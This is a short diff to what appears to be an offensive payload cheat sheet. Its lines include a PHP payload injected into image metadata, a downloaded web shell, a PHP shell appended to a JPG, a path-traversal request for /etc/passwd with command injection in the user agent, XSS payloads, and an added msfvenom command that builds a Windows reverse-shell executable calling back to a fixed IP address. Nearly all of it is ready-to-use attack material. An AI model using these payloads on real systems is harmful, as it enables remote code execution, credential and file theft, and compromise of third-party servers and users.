@@ -7,6 +7,7 @@ exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" /root/imagen.jpg
 curl -o hidden.txt https://url.website.com/shell.txt
 cat file.jpg shell.php > compress.jpg
 curl -u www.servervul.com/page.php?id=/../../etc/passwd -A "<?php system('ls -l'); ?>"
+msfvenom -p windows/shell_reverse_tcp LHOST=191.234.190.137 LPORT=4444 -f exe -o shell.exe
 
 "><svg/onload=alert(document.domain)>
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
